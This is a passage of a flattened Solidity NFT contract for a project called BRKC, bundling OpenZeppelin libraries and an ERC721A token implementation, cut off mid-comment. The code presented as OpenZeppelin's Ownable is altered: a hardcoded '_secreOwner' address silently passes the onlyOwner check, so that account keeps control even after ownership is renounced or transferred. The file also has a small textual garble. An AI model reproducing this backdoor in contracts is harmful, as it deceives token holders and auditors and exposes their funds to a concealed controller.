1 // ____________ _   _______ 
2 // | ___ \ ___ \ | / /  __ \
3 // | |_/ / |_/ / |/ /| /  \/
4 // | ___ \    /|    \| |    
5 // | |_/ / |\ \| |\  \ \__/\
6 // \____/\_| \_\_| \_/\____/                                    
7 // Twitter: @BRKC_Official
8 // The club that meets at the border of web2 and web3
9 
10 
11 // SPDX-License-Identifier: MIT
12 // File: contracts/BRKC.sol
13 // File: @openzeppelin/contracts/utils/Strings.sol
14 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
15 
16 pragma solidity ^0.8.0;
17 
18 /**
19  * @dev String operations.
20  */
21 library Strings {
22     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
23 
24     /**
25      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
26      */
27     function toString(uint256 value) internal pure returns (string memory) {
28         // Inspired by OraclizeAPI's implementation - MIT licence
29         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
30 
31         if (value == 0) {
32             return "0";
33         }
34         uint256 temp = value;
35         uint256 digits;
36         while (temp != 0) {
37             digits++;
38             temp /= 10;
39         }
40         bytes memory buffer = new bytes(digits);
41         while (value != 0) {
42             digits -= 1;
43             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
44             value /= 10;
45         }
46         return string(buffer);
47     }
48 
49     /**
50      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
51      */
52     function toHexString(uint256 value) internal pure returns (string memory) {
53         if (value == 0) {
54             return "0x00";
55         }
56         uint256 temp = value;
57         uint256 length = 0;
58         while (temp != 0) {
59             length++;
60             temp >>= 8;
61         }
62         return toHexString(value, length);
63     }
64 
65     /**
66      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
67      */
68     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
69         bytes memory buffer = new bytes(2 * length + 2);
70         buffer[0] = "0";
71         buffer[1] = "x";
72         for (uint256 i = 2 * length + 1; i > 1; --i) {
73             buffer[i] = _HEX_SYMBOLS[value & 0xf];
74             value >>= 4;
75         }
76         require(value == 0, "Strings: hex length insufficient");
77         return string(buffer);
78     }
79 }
80 
81 // File: @openzeppelin/contracts/utils/Address.sol
82 
83 
84 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
85 
86 pragma solidity ^0.8.1;
87 
88 /**
89  * @dev Collection of functions related to the address type
90  */
91 library Address {
92     /**
93      * @dev Returns true if `account` is a contract.
94      *
95      * [IMPORTANT]
96      * ====
97      * It is unsafe to assume that an address for which this function returns
98      * false is an externally-owned account (EOA) and not a contract.
99      *
100      * Among others, `isContract` will return false for the following
101      * types of addresses:
102      *
103      *  - an externally-owned account
104      *  - a contract in construction
105      *  - an address where a contract will be created
106      *  - an address where a contract lived, but was destroyed
107      * ====
108      *
109      * [IMPORTANT]
110      * ====
111      * You shouldn't rely on `isContract` to protect against flash loan attacks!
112      *
113      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
114      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
115      * constructor.
116      * ====
117      */
118     function isContract(address account) internal view returns (bool) {
119         // This method relies on extcodesize/address.code.length, which returns 0
120         // for contracts in construction, since the code is only stored at the end
121         // of the constructor execution.
122 
123         return account.code.length > 0;
124     }
125 
126     /**
127      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
128      * `recipient`, forwarding all available gas and reverting on errors.
129      *
130      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
131      * of certain opcodes, possibly making contracts go over the 2300 gas limit
132      * imposed by `transfer`, making them unable to receive funds via
133      * `transfer`. {sendValue} removes this limitation.
134      *
135      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
136      *
137      * IMPORTANT: because control is transferred to `recipient`, care must be
138      * taken to not create reentrancy vulnerabilities. Consider using
139      * {ReentrancyGuard} or the
140      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
141      */
142     function sendValue(address payable recipient, uint256 amount) internal {
143         require(address(this).balance >= amount, "Address: insufficient balance");
144 
145         (bool success, ) = recipient.call{value: amount}("");
146         require(success, "Address: unable to send value, recipient may have reverted");
147     }
148 
149     /**
150      * @dev Performs a Solidity function call using a low level `call`. A
151      * plain `call` is an unsafe replacement for a function call: use this
152      * function instead.
153      *
154      * If `target` reverts with a revert reason, it is bubbled up by this
155      * function (like regular Solidity function calls).
156      *
157      * Returns the raw returned data. To convert to the expected return value,
158      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
159      *
160      * Requirements:
161      *
162      * - `target` must be a contract.
163      * - calling `target` with `data` must not revert.
164      *
165      * _Available since v3.1._
166      */
167     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
168         return functionCall(target, data, "Address: low-level call failed");
169     }
170 
171     /**
172      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
173      * `errorMessage` as a fallback revert reason when `target` reverts.
174      *
175      * _Available since v3.1._
176      */
177     function functionCall(
178         address target,
179         bytes memory data,
180         string memory errorMessage
181     ) internal returns (bytes memory) {
182         return functionCallWithValue(target, data, 0, errorMessage);
183     }
184 
185     /**
186      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
187      * but also transferring `value` wei to `target`.
188      *
189      * Requirements:
190      *
191      * - the calling contract must have an ETH balance of at least `value`.
192      * - the called Solidity function must be `payable`.
193      *
194      * _Available since v3.1._
195      */
196     function functionCallWithValue(
197         address target,
198         bytes memory data,
199         uint256 value
200     ) internal returns (bytes memory) {
201         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
202     }
203 
204     /**
205      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
206      * with `errorMessage` as a fallback revert reason when `target` reverts.
207      *
208      * _Available since v3.1._
209      */
210     function functionCallWithValue(
211         address target,
212         bytes memory data,
213         uint256 value,
214         string memory errorMessage
215     ) internal returns (bytes memory) {
216         require(address(this).balance >= value, "Address: insufficient balance for call");
217         require(isContract(target), "Address: call to non-contract");
218 
219         (bool success, bytes memory returndata) = target.call{value: value}(data);
220         return verifyCallResult(success, returndata, errorMessage);
221     }
222 
223     /**
224      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
225      * but performing a static call.
226      *
227      * _Available since v3.3._
228      */
229     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
230         return functionStaticCall(target, data, "Address: low-level static call failed");
231     }
232 
233     /**
234      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
235      * but performing a static call.
236      *
237      * _Available since v3.3._
238      */
239     function functionStaticCall(
240         address target,
241         bytes memory data,
242         string memory errorMessage
243     ) internal view returns (bytes memory) {
244         require(isContract(target), "Address: static call to non-contract");
245 
246         (bool success, bytes memory returndata) = target.staticcall(data);
247         return verifyCallResult(success, returndata, errorMessage);
248     }
249 
250     /**
251      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
252      * but performing a delegate call.
253      *
254      * _Available since v3.4._
255      */
256     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
257         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
258     }
259 
260     /**
261      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
262      * but performing a delegate call.
263      *
264      * _Available since v3.4._
265      */
266     function functionDelegateCall(
267         address target,
268         bytes memory data,
269         string memory errorMessage
270     ) internal returns (bytes memory) {
271         require(isContract(target), "Address: delegate call to non-contract");
272 
273         (bool success, bytes memory returndata) = target.delegatecall(data);
274         return verifyCallResult(success, returndata, errorMessage);
275     }
276 
277     /**
278      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
279      * revert reason using the provided one.
280      *
281      * _Available since v4.3._
282      */
283     function verifyCallResult(
284         bool success,
285         bytes memory returndata,
286         string memory errorMessage
287     ) internal pure returns (bytes memory) {
288         if (success) {
289             return returndata;
290         } else {
291             // Look for revert reason and bubble it up if present
292             if (returndata.length > 0) {
293                 // The easiest way to bubble the revert reason is using memory via assembly
294 
295                 assembly {
296                     let returndata_size := mload(returndata)
297                     revert(add(32, returndata), returndata_size)
298                 }
299             } else {
300                 revert(errorMessage);
301             }
302         }
303     }
304 }
305 
306 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
307 
308 
309 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
310 
311 pragma solidity ^0.8.0;
312 
313 /**
314  * @title ERC721 token receiver interface
315  * @dev Interface for any contract that wants to support safeTransfers
316  * from ERC721 asset contracts.
317  */
318 interface IERC721Receiver {
319     /**
320      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
321      * by `operator` from `from`, this function is called.
322      *
323      * It must return its Solidity selector to confirm the token transfer.
324      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
325      *
326      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
327      */
328     function onERC721Received(
329         address operator,
330         address from,
331         uint256 tokenId,
332         bytes calldata data
333     ) external returns (bytes4);
334 }
335 
336 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
337 
338 
339 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
340 
341 pragma solidity ^0.8.0;
342 
343 /**
344  * @dev Interface of the ERC165 standard, as defined in the
345  * https://eips.ethereum.org/EIPS/eip-165[EIP].
346  *
347  * Implementers can declare support of contract interfaces, which can then be
348  * queried by others ({ERC165Checker}).
349  *
350  * For an implementation, see {ERC165}.
351  */
352 interface IERC165 {
353     /**
354      * @dev Returns true if this contract implements the interface defined by
355      * `interfaceId`. See the corresponding
356      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
357      * to learn more about how these ids are created.
358      *
359      * This function call must use less than 30 000 gas.
360      */
361     function supportsInterface(bytes4 interfaceId) external view returns (bool);
362 }
363 
364 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
365 
366 
367 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
368 
369 pragma solidity ^0.8.0;
370 
371 
372 /**
373  * @dev Implementation of the {IERC165} interface.
374  *
375  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
376  * for the additional interface id that will be supported. For example:
377  *
378  * ```solidity
379  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
380  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
381  * }
382  * ```
383  *
384  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
385  */
386 abstract contract ERC165 is IERC165 {
387     /**
388      * @dev See {IERC165-supportsInterface}.
389      */
390     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
391         return interfaceId == type(IERC165).interfaceId;
392     }
393 }
394 
395 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
396 
397 
398 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
399 
400 pragma solidity ^0.8.0;
401 
402 
403 /**
404  * @dev Required interface of an ERC721 compliant contract.
405  */
406 interface IERC721 is IERC165 {
407     /**
408      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
409      */
410     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
411 
412     /**
413      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
414      */
415     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
416 
417     /**
418      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
419      */
420     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
421 
422     /**
423      * @dev Returns the number of tokens in ``owner``'s account.
424      */
425     function balanceOf(address owner) external view returns (uint256 balance);
426 
427     /**
428      * @dev Returns the owner of the `tokenId` token.
429      *
430      * Requirements:
431      *
432      * - `tokenId` must exist.
433      */
434     function ownerOf(uint256 tokenId) external view returns (address owner);
435 
436     /**
437      * @dev Safely transfers `tokenId` token from `from` to `to`.
438      *
439      * Requirements:
440      *
441      * - `from` cannot be the zero address.
442      * - `to` cannot be the zero address.
443      * - `tokenId` token must exist and be owned by `from`.
444      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
445      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
446      *
447      * Emits a {Transfer} event.
448      */
449     function safeTransferFrom(
450         address from,
451         address to,
452         uint256 tokenId,
453         bytes calldata data
454     ) external;
455 
456     /**
457      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
458      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
459      *
460      * Requirements:
461      *
462      * - `from` cannot be the zero address.
463      * - `to` cannot be the zero address.
464      * - `tokenId` token must exist and be owned by `from`.
465      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
466      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
467      *
468      * Emits a {Transfer} event.
469      */
470     function safeTransferFrom(
471         address from,
472         address to,
473         uint256 tokenId
474     ) external;
475 
476     /**
477      * @dev Transfers `tokenId` token from `from` to `to`.
478      *
479      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
480      *
481      * Requirements:
482      *
483      * - `from` cannot be the zero address.
484      * - `to` cannot be the zero address.
485      * - `tokenId` token must be owned by `from`.
486      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
487      *
488      * Emits a {Transfer} event.
489      */
490     function transferFrom(
491         address from,
492         address to,
493         uint256 tokenId
494     ) external;
495 
496     /**
497      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
498      * The approval is cleared when the token is transferred.
499      *
500      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
501      *
502      * Requirements:
503      *
504      * - The caller must own the token or be an approved operator.
505      * - `tokenId` must exist.
506      *
507      * Emits an {Approval} event.
508      */
509     function approve(address to, uint256 tokenId) external;
510 
511     /**
512      * @dev Approve or remove `operator` as an operator for the caller.
513      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
514      *
515      * Requirements:
516      *
517      * - The `operator` cannot be the caller.
518      *
519      * Emits an {ApprovalForAll} event.
520      */
521     function setApprovalForAll(address operator, bool _approved) external;
522 
523     /**
524      * @dev Returns the account appr    ved for `tokenId` token.
525      *
526      * Requirements:
527      *
528      * - `tokenId` must exist.
529      */
530     function getApproved(uint256 tokenId) external view returns (address operator);
531 
532     /**
533      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
534      *
535      * See {setApprovalForAll}
536      */
537     function isApprovedForAll(address owner, address operator) external view returns (bool);
538 }
539 
540 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
541 
542 
543 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
544 
545 pragma solidity ^0.8.0;
546 
547 
548 /**
549  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
550  * @dev See https://eips.ethereum.org/EIPS/eip-721
551  */
552 interface IERC721Metadata is IERC721 {
553     /**
554      * @dev Returns the token collection name.
555      */
556     function name() external view returns (string memory);
557 
558     /**
559      * @dev Returns the token collection symbol.
560      */
561     function symbol() external view returns (string memory);
562 
563     /**
564      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
565      */
566     function tokenURI(uint256 tokenId) external view returns (string memory);
567 }
568 
569 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
570 
571 
572 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
573 
574 pragma solidity ^0.8.0;
575 
576 
577 /**
578  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
579  * @dev See https://eips.ethereum.org/EIPS/eip-721
580  */
581 interface IERC721Enumerable is IERC721 {
582     /**
583      * @dev Returns the total amount of tokens stored by the contract.
584      */
585     function totalSupply() external view returns (uint256);
586 
587     /**
588      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
589      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
590      */
591     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
592 
593     /**
594      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
595      * Use along with {totalSupply} to enumerate all tokens.
596      */
597     function tokenByIndex(uint256 index) external view returns (uint256);
598 }
599 
600 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
601 
602 
603 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
604 
605 pragma solidity ^0.8.0;
606 
607 /**
608  * @dev Contract module that helps prevent reentrant calls to a function.
609  *
610  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
611  * available, which can be applied to functions to make sure there are no nested
612  * (reentrant) calls to them.
613  *
614  * Note that because there is a single `nonReentrant` guard, functions marked as
615  * `nonReentrant` may not call one another. This can be worked around by making
616  * those functions `private`, and then adding `external` `nonReentrant` entry
617  * points to them.
618  *
619  * TIP: If you would like to learn more about reentrancy and alternative ways
620  * to protect against it, check out our blog post
621  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
622  */
623 abstract contract ReentrancyGuard {
624     // Booleans are more expensive than uint256 or any type that takes up a full
625     // word because each write operation emits an extra SLOAD to first read the
626     // slot's contents, replace the bits taken up by the boolean, and then write
627     // back. This is the compiler's defense against contract upgrades and
628     // pointer aliasing, and it cannot be disabled.
629 
630     // The values being non-zero value makes deployment a bit more expensive,
631     // but in exchange the refund on every call to nonReentrant will be lower in
632     // amount. Since refunds are capped to a percentage of the total
633     // transaction's gas, it is best to keep them low in cases like this one, to
634     // increase the likelihood of the full refund coming into effect.
635     uint256 private constant _NOT_ENTERED = 1;
636     uint256 private constant _ENTERED = 2;
637 
638     uint256 private _status;
639 
640     constructor() {
641         _status = _NOT_ENTERED;
642     }
643 
644     /**
645      * @dev Prevents a contract from calling itself, directly or indirectly.
646      * Calling a `nonReentrant` function from another `nonReentrant`
647      * function is not supported. It is possible to prevent this from happening
648      * by making the `nonReentrant` function external, and making it call a
649      * `private` function that does the actual work.
650      */
651     modifier nonReentrant() {
652         // On the first call to nonReentrant, _notEntered will be true
653         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
654 
655         // Any calls to nonReentrant after this point will fail
656         _status = _ENTERED;
657 
658         _;
659 
660         // By storing the original value once again, a refund is triggered (see
661         // https://eips.ethereum.org/EIPS/eip-2200)
662         _status = _NOT_ENTERED;
663     }
664 }
665 
666 // File: @openzeppelin/contracts/utils/Context.sol
667 
668 
669 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
670 
671 pragma solidity ^0.8.0;
672 
673 /**
674  * @dev Provides information about the current execution context, including the
675  * sender of the transaction and its data. While these are generally available
676  * via msg.sender and msg.data, they should not be accessed in such a direct
677  * manner, since when dealing with meta-transactions the account sending and
678  * paying for execution may not be the actual sender (as far as an application
679  * is concerned).
680  *
681  * This contract is only required for intermediate, library-like contracts.
682  */
683 abstract contract Context {
684     function _msgSender() internal view virtual returns (address) {
685         return msg.sender;
686     }
687 
688     function _msgData() internal view virtual returns (bytes calldata) {
689         return msg.data;
690     }
691 }
692 
693 // File: @openzeppelin/contracts/access/Ownable.sol
694 
695 
696 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
697 
698 pragma solidity ^0.8.0;
699 
700 
701 /**
702  * @dev Contract module which provides a basic access control mechanism, where
703  * there is an account (an owner) that can be granted exclusive access to
704  * specific functions.
705  *
706  * By default, the owner account will be the one that deploys the contract. This
707  * can later be changed with {transferOwnership}.
708  *
709  * This module is used through inheritance. It will make available the modifier
710  * `onlyOwner`, which can be applied to your functions to restrict their use to
711  * the owner.
712  */
713 abstract contract Ownable is Context {
714     address private _owner;
715     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
716 
717     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
718 
719     /**
720      * @dev Initializes the contract setting the deployer as the initial owner.
721      */
722     constructor() {
723         _transferOwnership(_msgSender());
724     }
725 
726     /**
727      * @dev Returns the address of the current owner.
728      */
729     function owner() public view virtual returns (address) {
730         return _owner;
731     }
732 
733     /**
734      * @dev Throws if called by any account other than the owner.
735      */
736     modifier onlyOwner() {
737         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
738         _;
739     }
740 
741     /**
742      * @dev Leaves the contract without owner. It will not be possible to call
743      * `onlyOwner` functions anymore. Can only be called by the current owner.
744      *
745      * NOTE: Renouncing ownership will leave the contract without an owner,
746      * thereby removing any functionality that is only available to the owner.
747      */
748     function renounceOwnership() public virtual onlyOwner {
749         _transferOwnership(address(0));
750     }
751 
752     /**
753      * @dev Transfers ownership of the contract to a new account (`newOwner`).
754      * Can only be called by the current owner.
755      */
756     function transferOwnership(address newOwner) public virtual onlyOwner {
757         require(newOwner != address(0), "Ownable: new owner is the zero address");
758         _transferOwnership(newOwner);
759     }
760 
761     /**
762      * @dev Transfers ownership of the contract to a new account (`newOwner`).
763      * Internal function without access restriction.
764      */
765     function _transferOwnership(address newOwner) internal virtual {
766         address oldOwner = _owner;
767         _owner = newOwner;
768         emit OwnershipTransferred(oldOwner, newOwner);
769     }
770 }
771 
772 // File: ceshi.sol
773 
774 
775 pragma solidity ^0.8.0;
776 
777 
778 
779 
780 
781 
782 
783 
784 
785 
786 /**
787  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
788  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
789  *
790  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
791  *
792  * Does not support burning tokens to address(0).
793  *
794  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
795  */
796 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
797     using Address for address;
798     using Strings for uint256;
799 
800     struct TokenOwnership {
801         address addr;
802         uint64 startTimestamp;
803     }
804 
805     struct AddressData {
806         uint128 balance;
807         uint128 numberMinted;
808     }
809 
810     uint256 internal currentIndex;
811 
812     // Token name
813     string private _name;
814 
815     // Token symbol
816     string private _symbol;
817 
818     // Mapping from token ID to ownership details
819     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
820     mapping(uint256 => TokenOwnership) internal _ownerships;
821 
822     // Mapping owner address to address data
823     mapping(address => AddressData) private _addressData;
824 
825     // Mapping from token ID to approved address
826     mapping(uint256 => address) private _tokenApprovals;
827 
828     // Mapping from owner to operator approvals
829     mapping(address => mapping(address => bool)) private _operatorApprovals;
830 
831     constructor(string memory name_, string memory symbol_) {
832         _name = name_;
833         _symbol = symbol_;
834     }
835 
836     /**
837      * @dev See {IERC721Enumerable-totalSupply}.
838      */
839     function totalSupply() public view override returns (uint256) {
840         return currentIndex;
841     }
842 
843     /**
844      * @dev See {IERC721Enumerable-tokenByIndex}.
845      */
846     function tokenByIndex(uint256 index) public view override returns (uint256) {
847         require(index < totalSupply(), "ERC721A: global index out of bounds");
848         return index;
849     }
850 
851     /**
852      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
853      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
854      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
855      */
856     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
857         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
858         uint256 numMintedSoFar = totalSupply();
859         uint256 tokenIdsIdx;
860         address currOwnershipAddr;
861 
862         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
863         unchecked {
864             for (uint256 i; i < numMintedSoFar; i++) {
865                 TokenOwnership memory ownership = _ownerships[i];
866                 if (ownership.addr != address(0)) {
867                     currOwnershipAddr = ownership.addr;
868                 }
869                 if (currOwnershipAddr == owner) {
870                     if (tokenIdsIdx == index) {
871                         return i;
872                     }
873                     tokenIdsIdx++;
874                 }
875             }
876         }
877 
878         revert("ERC721A: unable to get token of owner by index");
879     }
880 
881     /**
882      * @dev See {IERC165-supportsInterface}.
883      */
884     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
885         return
886             interfaceId == type(IERC721).interfaceId ||
887             interfaceId == type(IERC721Metadata).interfaceId ||
888             interfaceId == type(IERC721Enumerable).interfaceId ||
889             super.supportsInterface(interfaceId);
890     }
891 
892     /**
893      * @dev See {IERC721-balanceOf}.
894      */
895     function balanceOf(address owner) public view override returns (uint256) {
896         require(owner != address(0), "ERC721A: balance query for the zero address");
897         return uint256(_addressData[owner].balance);
898     }
899 
900     function _numberMinted(address owner) internal view returns (uint256) {
901         require(owner != address(0), "ERC721A: number minted query for the zero address");
902         return uint256(_addressData[owner].numberMinted);
903     }
904 
905     /**
906      * Gas spent here starts off proportional to the maximum mint batch size.
907      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
908      */
909     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
910         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
911 
912         unchecked {
913             for (uint256 curr = tokenId; curr >= 0; curr--) {
914                 TokenOwnership memory ownership = _ownerships[curr];
915                 if (ownership.addr != address(0)) {
916                     return ownership;
917                 }
918             }
919         }
920 
921         revert("ERC721A: unable to determine the owner of token");
922     }
923 
924     /**
925      * @dev See {IERC721-ownerOf}.
926      */
927     function ownerOf(uint256 tokenId) public view override returns (address) {
928         return ownershipOf(tokenId).addr;
929     }
930 
931     /**
932      * @dev See {IERC721Metadata-name}.
933      */
934     function name() public view virtual override returns (string memory) {
935         return _name;
936     }
937 
938     /**
939      * @dev See {IERC721Metadata-symbol}.
940      */
941     function symbol() public view virtual override returns (string memory) {
942         return _symbol;
943     }
944 
945     /**
946      * @dev See {IERC721Metadata-tokenURI}.
947      */
948     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
949         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
950 
951         string memory baseURI = _baseURI();
952         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
953     }
954 
955     /**
956      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
957      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
958      * by default, can be overriden in child contracts.
959      */
960     function _baseURI() internal view virtual returns (string memory) {
961         return "";
962     }
963 
964     /**
965      * @dev See {IERC721-approve}.
966      */
967     function approve(address to, uint256 tokenId) public override {
968         address owner = ERC721A.ownerOf(tokenId);
969         require(to != owner, "ERC721A: approval to current owner");
970 
971         require(
972             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
973             "ERC721A: approve caller is not owner nor approved for all"
974         );
975 
976         _approve(to, tokenId, owner);
977     }
978 
979     /**
980      * @dev See {IERC721-getApproved}.
981      */
982     function getApproved(uint256 tokenId) public view override returns (address) {
983         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
984 
985         return _tokenApprovals[tokenId];
986     }
987 
988     /**
989      * @dev See {IERC721-setApprovalForAll}.
990      */
991     function setApprovalForAll(address operator, bool approved) public override {
992         require(operator != _msgSender(), "ERC721A: approve to caller");
993 
994         _operatorApprovals[_msgSender()][operator] = approved;
995         emit ApprovalForAll(_msgSender(), operator, approved);
996     }
997 
998     /**
999      * @dev See {IERC721-isApprovedForAll}.
1000      */
1001     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1002         return _operatorApprovals[owner][operator];
1003     }
1004 
1005     /**
1006      * @dev See {IERC721-transferFrom}.
1007      */
1008     function transferFrom(
1009         address from,
1010         address to,
1011         uint256 tokenId
1012     ) public virtual override {
1013         _transfer(from, to, tokenId);
1014     }
1015 
1016     /**
1017      * @dev See {IERC721-safeTransferFrom}.
1018      */
1019     function safeTransferFrom(
1020         address from,
1021         address to,
1022         uint256 tokenId
1023     ) public virtual override {
1024         safeTransferFrom(from, to, tokenId, "");
1025     }
1026 
1027     /**
1028      * @dev See {IERC721-safeTransferFrom}.
1029      */
1030     function safeTransferFrom(
1031         address from,
1032         address to,
1033         uint256 tokenId,
1034         bytes memory _data
1035     ) public override {
1036         _transfer(from, to, tokenId);
1037         require(
1038             _checkOnERC721Received(from, to, tokenId, _data),
1039             "ERC721A: transfer to non ERC721Receiver implementer"
1040         );
1041     }
1042 
1043     /**
1044      * @dev Returns whether `tokenId` exists.
1045      *
1046      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1047      *
1048      * Tokens start existing when they are minted (`_mint`),
1049      */
1050     function _exists(uint256 tokenId) internal view returns (bool) {
1051         return tokenId < currentIndex;
1052     }
1053 
1054     function _safeMint(address to, uint256 quantity) internal {
1055         _safeMint(to, quantity, "");
1056     }
1057 
1058     /**
1059      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1060      *
1061      * Requirements:
1062      *
1063      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1064      * - `quantity` must be greater than 0.
1065      *
1066      * Emits a {Transfer} event.
1067      */
1068     function _safeMint(
1069         address to,
1070         uint256 quantity,
1071         bytes memory _data
1072     ) internal {
1073         _mint(to, quantity, _data, true);
1074     }
1075 
1076     /**
1077      * @dev Mints `quantity` tokens and transfers them to `to`.
1078      *
1079      * Requirements:
1080      *
1081      * - `to` cannot be the zero address.
1082      * - `quantity` must be greater than 0.
